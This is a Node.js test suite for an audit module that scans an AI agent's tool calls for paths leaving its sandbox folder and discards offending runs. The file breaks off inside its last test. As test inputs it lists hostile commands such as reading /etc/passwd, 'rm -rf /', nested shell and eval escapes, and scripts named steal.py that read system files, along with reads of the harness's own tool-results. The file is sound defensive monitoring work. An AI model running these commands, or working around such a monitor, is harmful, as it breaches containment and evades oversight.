'use strict';
const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { cwdKeyFor, extractToolCalls, toolResultTexts, auditToolCalls } = require('../backend/agents/path-audit.cjs');

let counter = 0;
const nextId = () => 'toolu_' + (++counter);
const bash = command => ({ type: 'assistant', message: { content: [{ type: 'tool_use', id: nextId(), name: 'Bash', input: { command } }] } });
const tool = (name, input) => ({ type: 'assistant', message: { content: [{ type: 'tool_use', id: nextId(), name, input }] } });
const kinds = result => result.violations.map(v => v.kind);

/* A pilot folder two levels below a scratch directory, plus a Claude configuration directory, all synthetic. */
function fixture(t) {
  const base = fs.mkdtempSync(path.join(os.tmpdir(), 'finance-audit-test-'));
  t.after(() => fs.rmSync(base, { recursive: true, force: true }));
  const folder = path.join(base, 'pilots', 'run-1');
  for (const dir of ['filesystem', 'outputs', '.tmp']) fs.mkdirSync(path.join(folder, dir), { recursive: true });
  const configDir = path.join(base, 'cfg', '.claude');
  fs.mkdirSync(path.join(configDir, 'projects', 'x', 'tool-results'), { recursive: true });
  fs.writeFileSync(path.join(configDir, 'projects', 'x', 'tool-results', 'y.txt'), 'spill');
  return {
    base,
    folder,
    configDir,
    audit: (events, extra = {}) => auditToolCalls(Array.isArray(events) ? events : [events], { folder, claudeConfigDir: configDir, ...extra }),
  };
}

function assertClean(fx, events, message) {
  const result = fx.audit(events);
  assert.deepEqual(result.violations, [], message || 'expected no violations');
  assert.equal(result.status, 'CLEAN');
}

function assertFlags(fx, events, kind, message) {
  const result = fx.audit(events);
  assert.ok(kinds(result).includes(kind), `${message || 'expected'} ${kind}, got ${JSON.stringify(result.violations)}`);
  assert.equal(result.status, 'DISCARDED');
  return result;
}

test('cwdKeyFor replaces slashes and underscores with dashes', () => {
  assert.equal(cwdKeyFor('/tmp/finance_studio/run_1'), '-tmp-finance-studio-run-1');
  assert.equal(cwdKeyFor('/a/b'), '-a-b');
});

test('extractToolCalls returns assistant tool_use blocks in order and ignores everything else', () => {
  const events = [
    { type: 'system', subtype: 'init', model: 'm' },
    { type: 'assistant', message: { content: [{ type: 'text', text: 'hello' }, { type: 'tool_use', id: 'a', name: 'Read', input: { file_path: 'x' } }, { type: 'tool_use', id: 'b', name: 'Bash', input: { command: 'ls' } }] } },
    { type: 'user', message: { content: [{ type: 'tool_result', tool_use_id: 'a', content: 'ok' }] } },
    { type: 'assistant', message: { content: [{ type: 'tool_use', id: 'a', name: 'Read', input: { file_path: 'x' } }] } },
    { type: 'assistant', message: { content: 'not an array' } },
    null,
    'junk',
    { type: 'result', result: 'done' },
  ];
  assert.deepEqual(extractToolCalls(events), [
    { id: 'a', name: 'Read', input: { file_path: 'x' } },
    { id: 'b', name: 'Bash', input: { command: 'ls' } },
  ]);
  assert.deepEqual(extractToolCalls(undefined), []);
  assert.deepEqual(extractToolCalls('nope'), []);
});

test('toolResultTexts reads string and block content and links each result to its call', () => {
  const events = [
    { type: 'user', message: { content: [{ type: 'tool_result', tool_use_id: 'a', content: 'plain' }, { type: 'tool_result', tool_use_id: 'b', content: [{ type: 'text', text: 'one' }, { type: 'image' }, { type: 'text', text: 'two' }] }] } },
    { type: 'assistant', message: { content: [{ type: 'tool_result', tool_use_id: 'c', content: 'wrong role' }] } },
    { type: 'user', message: { content: 'text only' } },
  ];
  assert.deepEqual(toolResultTexts(events), [
    { toolUseId: 'a', text: 'plain' },
    { toolUseId: 'b', text: 'one\ntwo' },
  ]);
});

test('every violation kind is reported with tool, kind, path and the offending call', t => {
  const fx = fixture(t);
  const abs = fx.audit(bash('cat /etc/passwd'));
  assert.equal(abs.status, 'DISCARDED');
  assert.deepEqual(Object.keys(abs.violations[0]).sort(), ['call', 'kind', 'path', 'tool']);
  assert.deepEqual({ tool: abs.violations[0].tool, kind: abs.violations[0].kind, path: abs.violations[0].path, call: abs.violations[0].call }, { tool: 'Bash', kind: 'abs', path: '/etc/passwd', call: 'cat /etc/passwd' });
  assertFlags(fx, bash('ls /'), 'bare-root');
  assertFlags(fx, bash('cd ../../elsewhere'), 'dotdot');
  assertFlags(fx, bash('cat ~/.bashrc'), 'home');
  assertFlags(fx, tool('Read', { file_path: path.join(fx.configDir, 'projects', 'x', 'tool-results', 'y.txt') }), 'harness-spill');
  assertFlags(fx, bash('cd'), 'bare-cd');
});

test('must-flag cases from the contract', t => {
  const fx = fixture(t);
  const dotdot = assertFlags(fx, bash('cd ../../claude-0'), 'dotdot', 'cd two levels up from a folder two levels deep');
  assert.equal(dotdot.violations[0].path, path.join(fx.base, 'claude-0'));
  assertFlags(fx, bash('ls /'), 'bare-root');
  assertFlags(fx, bash('find / -name x'), 'bare-root');
  assertFlags(fx, bash('cat ~/.bashrc'), 'home');
  assertFlags(fx, bash('cat $HOME/x'), 'home');
  assertFlags(fx, tool('Read', { file_path: '/etc/hosts' }), 'abs');
  assertFlags(fx, tool('Glob', { pattern: '*.csv', path: '/var/tmp' }), 'abs');
  assertFlags(fx, tool('Read', { file_path: path.join(fx.configDir, 'projects', 'x', 'tool-results', 'y.txt') }), 'harness-spill');
});

test('must-not-flag cases from the contract', t => {
  const fx = fixture(t);
  assertClean(fx, tool('Write', { file_path: path.join(fx.folder, '.tmp', 'a.txt'), content: 'scratch' }), 'a write to the folder .tmp');
  assertClean(fx, bash("sed -n '/a/,/b/p' filesystem/notes.txt"), 'sed address range');
  assertClean(fx, bash("sed -n '/start/,/end/p' filesystem/notes.txt"), 'sed address range with words');
  assertClean(fx, bash('python3 -c "a = 10; b = 4; print(a / b)"'), 'python division');
  assertClean(fx, bash('python3 -c "print(10/4, 3 /2)"'), 'python division without spaces');
  assertClean(fx, bash("python3 - <<'EOF'\nx = 10\ny = 4\nprint(x / y, x/y)\nEOF"), 'python division in a here document');
  assertClean(fx, bash('curl -s https://example.com/a/b/c.csv -o outputs/c.csv'), 'URL');
  assertClean(fx, bash('curl -s "http://example.com/some/path?x=/etc/passwd"'), 'URL with a path-like query');
  assertClean(fx, bash('ls nothing 2>/dev/null; cat filesystem/a.csv >/dev/null'), '/dev/null');
  assertClean(fx, bash(`cd ${path.join(fx.folder, 'filesystem')}; echo done > ../out.txt`), 'redirect to ../out.txt after cd into filesystem');
  assertClean(fx, bash(`cat ${path.join(fx.folder, 'filesystem', 'a.csv')} | wc -l`), 'absolute path inside the folder');
  assertClean(fx, tool('Read', { file_path: path.join(fx.folder, 'filesystem', 'a.csv') }), 'absolute Read inside the folder');
});

test('allowlisted devices and binaries only', t => {
  const fx = fixture(t);
  assertClean(fx, bash('echo x > /dev/null; echo y 2> /dev/stderr; echo z >> /dev/stdout'));
  assertClean(fx, bash('/usr/bin/env python3 --version; /bin/ls filesystem; /usr/local/bin/pdftotext -v'));
  assertFlags(fx, bash('ls /usr/bin'), 'abs', 'the directory itself is not allowlisted');
  assertFlags(fx, bash('cat /usr/lib/os-release'), 'abs');
  assertFlags(fx, bash('cat /dev/urandom'), 'abs');
  assertFlags(fx, bash('cat /dev/stdin'), 'abs');
});

test('the binary directories are for running programs, not for writing into', t => {
  const fx = fixture(t);
  assertClean(fx, bash('/usr/bin/env python3 -V < /usr/bin/true'), 'reading and running');
  assertClean(fx, tool('Read', { file_path: '/usr/bin/env' }));
  assertFlags(fx, bash('echo x > /usr/local/bin/tool'), 'abs');
  assertFlags(fx, bash('echo x >> /bin/sh'), 'abs');
  assertFlags(fx, tool('Write', { file_path: '/usr/local/bin/tool', content: 'x' }), 'abs');
  assertFlags(fx, tool('Edit', { file_path: '/usr/bin/env', old_string: 'a', new_string: 'b' }), 'abs');
  assertClean(fx, bash('echo x > /dev/null 2> /dev/stderr'), 'the three devices stay allowed for writing');
});

test('bare cd names its cause', t => {
  const fx = fixture(t);
  assert.deepEqual(fx.audit(bash('cd')).violations.map(v => [v.kind, v.path]), [['bare-cd', '(home directory)']]);
});

test('bare slash forms are bare-root, not plain abs', t => {
  const fx = fixture(t);
  for (const command of ['ls /', 'ls -la /', 'find / -name x', 'cd /', 'ls /*', 'du -sh /.', 'rm -rf /', 'ls "/"', "ls '/'", 'ls //']) {
    const result = fx.audit(bash(command));
    assert.deepEqual(kinds(result), ['bare-root'], command);
  }
});

test('tracked working directory starts at the folder and follows cd across calls', t => {
  const fx = fixture(t);
  assertClean(fx, [bash('cd filesystem'), bash('ls ../outputs'), bash('cat ../filesystem/a.csv > ../outputs/b.csv')]);
  assertClean(fx, [bash('cd filesystem && cd .. && ls'), bash('ls .')]);
  assertFlags(fx, [bash('cd filesystem'), bash('ls ../../x')], 'dotdot');
  assertFlags(fx, [bash('cd filesystem'), bash('cd ..'), bash('ls ..')], 'dotdot');
  assertFlags(fx, [bash('cd filesystem'), bash('cd ../..')], 'dotdot');
  assertClean(fx, bash('cd filesystem\ncd ..\nls .'), 'newline separated commands');
  assertFlags(fx, bash('ls ..'), 'dotdot', 'from the folder itself');
  assertFlags(fx, bash('cat filesystem/../../x'), 'dotdot', 'embedded ..');
  assertFlags(fx, bash('cd filesystem && ls ../../..'), 'dotdot');
});

test('cd follows absolute targets, cd - and pushd/popd', t => {
  const fx = fixture(t);
  const inner = path.join(fx.folder, 'filesystem');
  assertClean(fx, bash(`cd ${inner} && ls ../outputs && cd - && ls filesystem`));
  assertClean(fx, bash(`pushd ${inner} && ls ../outputs && popd && ls filesystem`));
  assertFlags(fx, bash(`pushd ${inner} && popd && ls ..`), 'dotdot', 'popd returns to the folder');
  assertFlags(fx, bash('cd /etc && ls'), 'abs');
  assertFlags(fx, bash('cd -P ../elsewhere'), 'dotdot', 'options before the operand');
  assertFlags(fx, bash('cd -- ../elsewhere'), 'dotdot', 'double dash before the operand');
  assertFlags(fx, bash('cd ~'), 'home');
  assertFlags(fx, bash('cd "$HOME"'), 'home');
  assertFlags(fx, bash('cd $OLDPWD'), 'home');
  assertFlags(fx, bash('cd'), 'bare-cd');
  assertClean(fx, bash('cd ""'), 'an empty operand changes nothing');
});

test('a cd that leaves the folder is one violation, later plain names are not piled on', t => {
  const fx = fixture(t);
  const result = fx.audit([bash('cd /etc'), bash('cat hosts'), bash('ls')]);
  assert.deepEqual(kinds(result), ['abs']);
});

test('subshell parentheses scope cd, command substitution runs in a subshell', t => {
  const fx = fixture(t);
  assertClean(fx, bash('(cd filesystem && ls ../outputs); ls outputs'));
  assertFlags(fx, bash('(cd filesystem); ls ../../x'), 'dotdot', 'cd inside parentheses does not persist');
  assertClean(fx, bash('x=$(cd filesystem && pwd); ls outputs'));
  assertFlags(fx, bash('echo $(cat /etc/passwd)'), 'abs');
  assertFlags(fx, bash('echo `cat /etc/passwd`'), 'abs');
  assertFlags(fx, bash('echo "result: $(ls /)"'), 'bare-root');
  assertFlags(fx, bash('echo "$(echo "$(cat /etc/hosts)")"'), 'abs', 'nested substitution with quotes');
  assertFlags(fx, bash('diff <(cat /etc/a) <(cat filesystem/b)'), 'abs', 'process substitution');
  assertClean(fx, bash('echo $((7 / 2)) "$((8 / 3))"'), 'arithmetic expansion');
});

test('variables, $PWD, $(pwd) and unknown cd targets', t => {
  const fx = fixture(t);
  assertFlags(fx, bash('D=/etc; cat $D/passwd'), 'abs');
  assertFlags(fx, bash('export D=/etc && cat "${D}/passwd"'), 'abs');
  assertClean(fx, bash('D=filesystem; cat $D/a.csv'));
  assertClean(fx, bash('cd $PWD/filesystem && ls'));
  assertFlags(fx, bash('cd $PWD/../..'), 'abs', 'expanded to an absolute path outside');
  assertFlags(fx, bash('cd $(pwd)/..'), 'abs');
  const unknown = fx.audit(bash('cd $SOMEWHERE; ls ../..'));
  assert.ok(kinds(unknown).includes('dotdot'), 'with an unknown cwd, .. paths cannot be shown to stay inside');
  assert.ok(unknown.notes.some(note => note.startsWith('cwd-unresolved')));
  assertClean(fx, bash('cd $SOMEWHERE; ls plain-name'), 'plain names with an unknown cwd are not flagged');
  assertClean(fx, bash('FOO=bar cat filesystem/a.csv'), 'environment prefix assignment');
  assertFlags(fx, bash('env FOO=bar cat /etc/hosts'), 'abs');
  assertFlags(fx, bash('time nohup cat /etc/hosts'), 'abs');
  assertClean(fx, bash('echo "$UNSET_VARIABLE/x" $1 $? $$'), 'unknown variables are not violations');
});

test('home references: ~, ~user, $HOME, ${HOME}, $OLDPWD, in any quoting', t => {
  const fx = fixture(t);
  for (const command of ['cat ~/x', 'ls ~', 'ls ~root', 'cat $HOME/x', 'cat ${HOME}/x', 'cat "$HOME/x"', "cat '$HOME/x'", 'echo $OLDPWD', 'cat ${HOME:-/x}/y', 'cp a ~/b', 'tar -C ~/ -x', 'x --out=~/y']) {
    assert.ok(kinds(fx.audit(bash(command))).includes('home'), command);
  }
  assertClean(fx, bash('echo $HOMEDIR ${HOMEDIR} home~dir'), 'similar names are not home');
  assertClean(fx, bash('echo "cost is ~5% of revenue" > outputs/note.txt'), 'a tilde inside prose');
});

test('symlinks inside the folder that point outside are violations when they exist', t => {
  const fx = fixture(t);
  const outside = path.join(fx.base, 'outside');
  fs.mkdirSync(outside);
  fs.writeFileSync(path.join(outside, 'secret.txt'), 'x');
  fs.symlinkSync(outside, path.join(fx.folder, 'filesystem', 'link'));
  fs.symlinkSync(path.join(outside, 'secret.txt'), path.join(fx.folder, 'outputs', 'file-link'));
  assertFlags(fx, bash('cat filesystem/link/secret.txt'), 'abs', 'relative path through a directory link');
  assertFlags(fx, bash('ls filesystem/link'), 'abs');
  assertFlags(fx, bash('cat outputs/file-link'), 'abs', 'file link');
  assertFlags(fx, tool('Read', { file_path: path.join(fx.folder, 'filesystem', 'link', 'secret.txt') }), 'abs', 'absolute path through a link');
  assertFlags(fx, tool('Write', { file_path: path.join(fx.folder, 'filesystem', 'link', 'new.txt'), content: 'x' }), 'abs', 'new file under a link');
  assertFlags(fx, [bash('cd filesystem'), bash('cat link/secret.txt')], 'abs');
  fs.symlinkSync(path.join(fx.folder, 'outputs'), path.join(fx.folder, 'filesystem', 'inner'));
  assertClean(fx, bash('ls filesystem/inner'), 'a link that stays inside is fine');
});

test('the folder reached through an alias is the same folder', t => {
  const fx = fixture(t);
  const alias = path.join(fx.base, 'alias');
  fs.symlinkSync(fx.folder, alias);
  assertClean(fx, bash(`cat ${alias}/filesystem/a.csv > ${alias}/outputs/b.csv`));
  const viaAlias = auditToolCalls([bash(`cat ${fx.folder}/filesystem/a.csv`)], { folder: alias, claudeConfigDir: fx.configDir });
  assert.equal(viaAlias.status, 'CLEAN');
  assertFlags(fx, bash(`cat ${alias}/../x`), 'abs');
});

test('the folder .tmp is clean, including through TMPDIR', t => {
  const fx = fixture(t);
  assertClean(fx, bash('echo x > $TMPDIR/a.txt && cat ${TMPDIR}/a.txt && cp $CLAUDE_CODE_TMPDIR/a.txt outputs/'));
  assertClean(fx, bash(`mktemp; mktemp -d; echo x > ${fx.folder}/.tmp/a.txt`));
  assertClean(fx, tool('Edit', { file_path: path.join(fx.folder, '.tmp', 'a.txt'), old_string: 'a', new_string: 'b' }));
  assertFlags(fx, bash('echo x > /tmp/a.txt'), 'abs');
  assertFlags(fx, bash('mktemp /tmp/x.XXXXXX'), 'abs');
  assertClean(fx, bash('echo x > $TMPDIR/../a.txt'), 'TMPDIR/.. leaves .tmp but is still inside the folder');
  assertFlags(fx, bash('echo x > $TMPDIR/../../a.txt'), 'abs', 'a second .. leaves the folder');
});

test('harness-spill is a violation like any other and the run is discarded', t => {
  const fx = fixture(t);
  const spill = path.join(fx.configDir, 'projects', cwdKeyFor(fx.folder), 'tool-results', 'big.txt');
  const result = fx.audit([tool('Read', { file_path: spill }), bash('cat ' + spill), bash('ls ' + fx.configDir)]);
  assert.equal(result.status, 'DISCARDED');
  assert.deepEqual(kinds(result), ['harness-spill', 'harness-spill', 'harness-spill']);
  assertFlags(fx, bash(`cat ${fx.base}/cfg/.claude/../.claude/projects/x/tool-results/y.txt`), 'harness-spill', 'reached through ..');
  assertFlags(fx, tool('Grep', { pattern: 'x', path: fx.configDir }), 'harness-spill');
  assertFlags(fx, tool('Glob', { pattern: path.join(fx.configDir, '**', '*.txt') }), 'harness-spill');
});

test('claudeConfigDir defaults to CLAUDE_CONFIG_DIR, then ~/.claude', t => {
  const saved = process.env.CLAUDE_CONFIG_DIR;
  t.after(() => { if (saved === undefined) delete process.env.CLAUDE_CONFIG_DIR; else process.env.CLAUDE_CONFIG_DIR = saved; });
  const fx = fixture(t);
  delete process.env.CLAUDE_CONFIG_DIR;
  const homeSpill = path.join(os.homedir(), '.claude', 'projects', 'x', 'tool-results', 'y.txt');
  assert.deepEqual(kinds(auditToolCalls([tool('Read', { file_path: homeSpill })], { folder: fx.folder })), ['harness-spill']);
  process.env.CLAUDE_CONFIG_DIR = fx.configDir;
  const envSpill = path.join(fx.configDir, 'projects', 'x', 'tool-results', 'y.txt');
  assert.deepEqual(kinds(auditToolCalls([tool('Read', { file_path: envSpill })], { folder: fx.folder })), ['harness-spill']);
  assert.deepEqual(kinds(auditToolCalls([tool('Read', { file_path: homeSpill })], { folder: fx.folder })), ['abs']);
});

test('there is no allowance: extra options change nothing and the audit is always strict', t => {
  const fx = fixture(t);
  const spill = tool('Read', { file_path: path.join(fx.configDir, 'projects', 'x', 'tool-results', 'y.txt') });
  const outside = bash('cat /etc/hosts');
  for (const extra of [{}, { allowHarness: true }, { allowHarnessSpill: true }, { strict: false }, { allow: ['/etc', fx.configDir] }, { allowTmp: true }, { allowedPaths: [fx.configDir, '/etc'] }, { mode: 'lenient' }]) {
    assert.equal(fx.audit([spill], extra).status, 'DISCARDED', JSON.stringify(extra));
    assert.equal(fx.audit([outside], extra).status, 'DISCARDED', JSON.stringify(extra));
  }
  assert.equal(auditToolCalls.length, 2);
});

test('auditToolCalls needs a real folder and tolerates odd event lists', t => {
  const fx = fixture(t);
  assert.throws(() => auditToolCalls([], {}), /folder/);
  assert.throws(() => auditToolCalls([], { folder: '' }), /folder/);
  assert.throws(() => auditToolCalls([], { folder: '/' }), /root/);
  assert.throws(() => auditToolCalls([], undefined), /folder/);
  assert.deepEqual(auditToolCalls(undefined, { folder: fx.folder }), { status: 'CLEAN', violations: [], notes: [] });
  assert.deepEqual(auditToolCalls([], { folder: fx.folder }), { status: 'CLEAN', violations: [], notes: [] });
});

test('file tools: path fields are checked as paths and resolve against the folder', t => {
  const fx = fixture(t);
  assertClean(fx, tool('Read', { file_path: 'filesystem/a.csv' }), 'relative to the folder');
  assertClean(fx, tool('Read', { file_path: 'a.csv', offset: 5, limit: 20 }));
  assertClean(fx, tool('Glob', { pattern: '**/*.xlsx' }));
  assertClean(fx, tool('Glob', { pattern: '*.csv', path: 'filesystem' }));
  assertClean(fx, tool('Grep', { pattern: 'revenue', path: 'filesystem', glob: '*.txt', output_mode: 'content' }));
  assertFlags(fx, tool('Read', { file_path: '../other/a.csv' }), 'dotdot');
  assertFlags(fx, tool('Read', { file_path: '~/notes.txt' }), 'home');
  assertFlags(fx, tool('Read', { file_path: '$HOME/notes.txt' }), 'home');
  assertFlags(fx, tool('Read', { file_path: '/' }), 'bare-root');
  assertFlags(fx, tool('Glob', { pattern: '/etc/**' }), 'abs');
  assertFlags(fx, tool('Glob', { pattern: '../**/*.csv' }), 'dotdot');
  assertFlags(fx, tool('Grep', { pattern: 'x', path: '/etc' }), 'abs');
  assertFlags(fx, tool('Grep', { pattern: 'x', glob: '../*.txt' }), 'dotdot');
  assertFlags(fx, tool('Write', { file_path: '/tmp/out.txt', content: 'x' }), 'abs');
  assertFlags(fx, tool('NotebookEdit', { notebook_path: '/tmp/n.ipynb', new_source: 'x' }), 'abs');
  assertFlags(fx, tool('MultiEdit', { file_path: '/tmp/m.txt', edits: [{ old_string: 'a', new_string: 'b' }] }), 'abs');
  assertFlags(fx, tool('LS', { path: '/Users' }), 'abs');
  assertFlags(fx, tool('Read', { paths: ['filesystem/a.csv', '/etc/hosts'] }), 'abs', 'array of paths');
});

test('file tools: contents and patterns are scanned as text, not as paths', t => {
  const fx = fixture(t);
  assertClean(fx, tool('Write', { file_path: 'outputs/tree.xml', content: '<root><home>a</home></root>' }), 'closing tags are not paths');
  assertClean(fx, tool('Write', { file_path: 'outputs/memo.md', content: 'Revenue / EBITDA = 3.2x; and/or 5/6; see https://example.com/a/b/c. FY25/FY24 grew ~5%.' }));
  assertClean(fx, tool('Write', { file_path: 'outputs/model.py', content: "ratio = revenue / cost\nparts = 'a/b/c'.split('/')\nprint(ratio)\n" }));
  assertClean(fx, tool('Grep', { pattern: '/revenue/', path: 'filesystem' }), 'a regex that begins with a slash');
  assertClean(fx, tool('Edit', { file_path: 'outputs/memo.md', old_string: 'Q1/Q2', new_string: 'Q1 / Q2' }));
  assertFlags(fx, tool('Write', { file_path: 'outputs/steal.py', content: "data = open('/etc/hosts').read()\n" }), 'abs', 'a script that reads outside');
  assertFlags(fx, tool('Write', { file_path: 'outputs/steal.py', content: "import os\nprint(os.path.expanduser('~'))\n" }), 'home');
  assertFlags(fx, tool('Edit', { file_path: 'outputs/x.py', old_string: 'a', new_string: "open('../../secret')" }), 'dotdot');
  assertFlags(fx, tool('Grep', { pattern: '/etc/passwd', path: 'filesystem' }), 'abs');
  assertFlags(fx, tool('Write', { file_path: 'outputs/n.md', content: 'config at $HOME/.config' }), 'home');
});

test('an unexpected tool is noted and its path fields are still checked', t => {
  const fx = fixture(t);
  const result = fx.audit(tool('TodoWrite', { todos: [{ content: 'read /etc/hosts' }] }));
  assert.deepEqual(result.notes, ['unexpected-tool: TodoWrite']);
  assert.deepEqual(kinds(result), ['abs']);
  const notes = fx.audit([tool('Read', { file_path: 'a' }), tool('Bash', { command: 'ls' }), tool('Glob', { pattern: '*' })]).notes;
  assert.deepEqual(notes, []);
});

test('shell structure: quoting, comments, continuations, wrappers and compound commands', t => {
  const fx = fixture(t);
  assertClean(fx, bash('echo "a;b && cd /" | tr "/" "_"'), 'operators inside quotes');
  assertClean(fx, bash("echo 'cat /etc/passwd'"), 'text in single quotes passed to echo');
  assertClean(fx, bash('ls # cd /\n# cat /etc/passwd\nls filesystem'), 'comments');
  assertFlags(fx, bash('cat \\\n  /etc/passwd'), 'abs', 'line continuation');
  assertFlags(fx, bash('true && cat /etc/passwd'), 'abs');
  assertFlags(fx, bash('false || cat /etc/passwd'), 'abs');
  assertFlags(fx, bash('ls | xargs cat /etc/hosts'), 'abs');
  assertFlags(fx, bash('for f in /etc/*; do cat "$f"; done'), 'abs');
  assertFlags(fx, bash('if [ -d /etc ]; then echo yes; fi'), 'abs');
  assertFlags(fx, bash('while read l; do echo $l; done < /etc/hosts'), 'abs');
  assertFlags(fx, bash('cat < /etc/hosts'), 'abs');
  assertFlags(fx, bash('echo x >> /etc/hosts'), 'abs');
  assertFlags(fx, bash('echo x 2> /etc/err'), 'abs');
  assertFlags(fx, bash('echo x &> /etc/err'), 'abs');
  assertFlags(fx, bash('echo x >| /etc/err'), 'abs');
  assertFlags(fx, bash('cat "/etc/my file"'), 'abs', 'a quoted path with a space');
  assertFlags(fx, bash('cat /etc/my\\ file'), 'abs', 'an escaped space');
  assertFlags(fx, bash('tar --directory=/etc -c x'), 'abs', '--option=value');
  assertFlags(fx, bash('cp -t /etc a b'), 'abs');
  assertFlags(fx, bash('tar -C/etc -xf outputs/a.tar'), 'abs', 'a directory glued to a short option');
  assertClean(fx, bash('tar -xf outputs/a.tar -C outputs && column -s/ -t filesystem/a.txt'), 'a lone slash glued to an option is a separator');
  assertFlags(fx, bash('dd if=/etc/hosts of=outputs/h'), 'abs', 'NAME=value operands');
  assertFlags(fx, bash('ln -s /etc outputs/etc-link'), 'abs');
  assertFlags(fx, bash('curl file:///etc/passwd'), 'abs', 'file URLs are paths');
  assertClean(fx, bash('echo x 2>&1 | head -3; ls nothing >&2; ls 1>&2'), 'file descriptor duplication');
  assertClean(fx, bash('python3 - 2>&1 <<EOF\nprint(1)\nEOF'));
  assertClean(fx, bash('cat <<-EOF\n\tnot a command: cd /\nEOF\nls filesystem'), 'here document bodies are text, not commands');
  assertClean(fx, bash("echo 'it''s' \"quoted \\\" mark\" $'ansi'"), 'quote handling does not throw');
});

test('nested shells and eval are audited', t => {
  const fx = fixture(t);
  assertFlags(fx, bash("bash -c 'cat /etc/passwd'"), 'abs');
  assertFlags(fx, bash('sh -c "cd /etc && ls"'), 'abs');
  assertFlags(fx, bash("bash -lc 'ls ../..'"), 'dotdot');
  assertFlags(fx, bash("bash -c \"bash -c 'cat /etc/passwd'\""), 'abs', 'two levels');
  assertFlags(fx, bash('eval "cat /etc/passwd"'), 'abs');
  assertFlags(fx, bash("bash <<'EOF'\ncd /etc\nEOF"), 'abs', 'a here document fed to a shell');
  assertClean(fx, bash("bash -c 'cd filesystem && ls ../outputs'"));
  assertClean(fx, [bash("bash -c 'cd filesystem'; true"), bash('ls outputs')], 'cd inside bash -c does not persist');
  assertFlags(fx, [bash("bash -c 'cd filesystem'"), bash('ls ../../x')], 'dotdot');
  assertFlags(fx, [bash('eval "cd filesystem"'), bash('ls ../..')], 'dotdot', 'cd inside eval persists');
});

test('commands whose arguments are patterns or scripts do not produce false positives', t => {
  const fx = fixture(t);
  assertClean(fx, bash('grep -rn "/revenue" filesystem'));
  assertClean(fx, bash("grep -rn --include='*.txt' -e '/a/b/c' filesystem"));
  assertClean(fx, bash('grep -n -A3 -B1 "x/y" filesystem/a.txt'));
  assertClean(fx, bash("rg '/revenue/' -g '!*/old/*' filesystem"));
  assertClean(fx, bash("sed -n -e '/a/,/b/p' -e '/c/p' filesystem/a.txt"));
  assertClean(fx, bash("sed -i 's/old/new/g' outputs/a.txt && sed 's#a/b#c/d#' filesystem/a.txt"));
  assertClean(fx, bash("awk -F/ '{print $1/$2}' filesystem/a.csv"));
  assertClean(fx, bash("awk -F'/' '/a/,/b/ {print}' filesystem/a.csv"));
  assertClean(fx, bash("jq '.a / .b' filesystem/a.json"));
  assertClean(fx, bash("echo a/b | cut -d '/' -f1"));
  assertClean(fx, bash("echo a/b | cut -d/ -f2"));
  assertClean(fx, bash("sort -t '/' -k2 filesystem/a.txt"));
  assertClean(fx, bash("echo a/b | tr '/' '_'"));
  assertClean(fx, bash('date +%Y/%m/%d'));
  assertClean(fx, bash("find . -name '*/x' -o -path '/y/*' -type f"));
  assertClean(fx, bash("find filesystem -type f -name '*.csv' -exec head -2 {} \\;"));
  assertClean(fx, bash("echo '/' && echo 'a sentence that mentions /etc/hosts' > outputs/n.txt"), 'echo prints text, it does not read paths');
  assertFlags(fx, bash('grep -f /etc/patterns filesystem/a.txt'), 'abs', 'the -f file is a path');
  assertFlags(fx, bash('grep -rn pattern /etc'), 'abs', 'the directory is a path');
  assertFlags(fx, bash("sed -n 'p' /etc/hosts"), 'abs', 'the file operand of sed');
  assertFlags(fx, bash("sed -f /etc/script.sed filesystem/a.txt"), 'abs');
  assertFlags(fx, bash("awk '{print}' /etc/hosts"), 'abs');
  assertFlags(fx, bash("awk -f /etc/prog.awk filesystem/a.txt"), 'abs');
  assertFlags(fx, bash("sort -o /etc/out filesystem/a.txt"), 'abs');
  assertFlags(fx, bash("find / -name x"), 'bare-root');
  assertFlags(fx, bash("find /etc -name x"), 'abs');
  assertFlags(fx, bash("find . -newer /etc/hosts"), 'abs');
  assertFlags(fx, bash("sed 's#a#b#w /etc/out' filesystem/a.txt"), 'abs', 'a sed script that writes to a well known directory');
  assertFlags(fx, bash("echo /etc/*"), 'abs', 'an unquoted glob that lists a directory');
  assertFlags(fx, bash("echo /"), 'bare-root');
});

test('inline interpreter code is scanned like text', t => {
  const fx = fixture(t);
  assertFlags(fx, bash(`python3 -c "open('/etc/hosts').read()"`), 'abs');
  assertFlags(fx, bash(`python3.11 -c "import pandas as pd; pd.read_csv('/var/data/x.csv')"`), 'abs');
  assertFlags(fx, bash(`python3 -c "open('../../x')"`), 'dotdot');
  assertFlags(fx, bash(`python3 -c "import os; print(os.path.expanduser('~'))"`), 'home');
  assertFlags(fx, bash(`python3 -c "from pathlib import Path; print(Path.home())"`), 'home');
  assertFlags(fx, bash(`python3 -c "import os; os.environ['HOME']"`), 'home');
  assertFlags(fx, bash(`node -e "require('fs').readFileSync('/etc/hosts')"`), 'abs');
  assertFlags(fx, bash(`perl -e 'open(F, "/etc/hosts")'`), 'abs');
  assertFlags(fx, bash("python3 - <<'EOF'\nimport os\nos.listdir('/Users')\nEOF"), 'abs');
  assertFlags(fx, bash("python3 <<EOF\nopen('../../x').read()\nEOF"), 'dotdot');
  assertFlags(fx, bash(`python3 ../x.py`), 'dotdot', 'a script path is a path');
  assertClean(fx, bash(`python3 -c "import pandas as pd; df = pd.read_csv('filesystem/a.csv'); print(df.a.sum() / df.b.sum())"`));
  assertClean(fx, bash(`perl -pe 's/a\\/b/c/' filesystem/a.txt`));
  assertClean(fx, bash(`node -e "console.log(10 / 4, '/')"`));
  assertClean(fx, bash("python3 - <<'EOF'\nimport re\nprint(re.sub(r'/\\*.*?\\*/', '', 'a /* b */ c'), 3 / 4, '/'.join(['a','b']))\nEOF"));
});

test('here strings and here documents written to files are scanned', t => {
  const fx = fixture(t);
  assertFlags(fx, bash('cat <<< "$HOME"'), 'home');
  assertFlags(fx, bash("cat > outputs/leak.py <<'EOF'\nimport os\nopen('/etc/hosts')\nEOF"), 'abs');
  assertClean(fx, bash("cat > outputs/memo.md <<'EOF'\n# Memo\nRevenue / cost = 3, margin and/or mix, see https://example.com/x/y\nEOF"));
});

test('each violation carries the offending call, truncated, and is reported once per call', t => {
  const fx = fixture(t);
  const long = 'echo ' + 'x'.repeat(2000) + ' && cat /etc/hosts && cat /etc/hosts && cat /etc/hosts';
  const result = fx.audit(bash(long));
  assert.equal(result.violations.length, 1, 'the same kind and path in one call is reported once');
  assert.ok(result.violations[0].call.length <= 400);
  const twoCalls = fx.audit([bash('cat /etc/hosts'), bash('cat /etc/hosts')]);
